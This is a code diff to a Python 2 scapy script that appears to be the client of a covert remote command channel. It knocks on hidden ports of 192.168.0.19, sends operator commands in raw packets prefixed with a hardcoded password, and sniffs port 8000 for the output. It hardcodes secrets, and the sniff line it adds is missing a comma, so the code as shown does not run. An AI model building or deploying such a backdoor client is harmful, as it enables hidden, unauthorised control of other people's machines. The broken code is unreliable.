@@ -6,6 +6,7 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
 knocks = [1000,2000,3000]
+password = 'dumb'
 
 def encrypt(data):
     ciphertext = triplesec.encrypt(data, 'top-secret-pw')
@@ -28,11 +29,12 @@ def sendCommand(protocol, data, password):
         packet = IP(dst="192.168.0.19")/UDP(dport=8000, sport=7999)/Raw(load=password+data)
     send(packet)
 
-#def parse(packet):
-
-
-
-
+def recvCommand(packet):
+   if packet.haslayer(IP) and packet.haslayer(Raw):
+        data = packet['Raw'].load
+        if data.startswith(password):
+            data = data[len(password):]
+            print data
 
 def main():
     portKnock()
@@ -40,6 +42,7 @@ def main():
     while 1:
         command = raw_input("Enter command: ")
         sendCommand('tcp', command, 'dumb')
+        sniff(filter='dst port 8000 and src port 8000', count=1 prn=recvCommand)
 
 if __name__ == '__main__':
     main()
